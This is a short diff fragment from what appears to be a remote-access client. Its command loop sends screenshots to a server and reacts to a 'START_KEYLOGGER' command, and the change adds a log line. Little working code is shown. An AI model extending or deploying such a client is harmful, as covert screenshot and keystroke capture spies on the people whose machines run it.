@@ -506,6 +506,7 @@ class Client(object):
                     self.send(errors(e).encode())
                     continue
                 self.send(content)
+                logging.info('Sent Screenshot to Server')
                 continue
 
             if data[0] == 'START_KEYLOGGER':
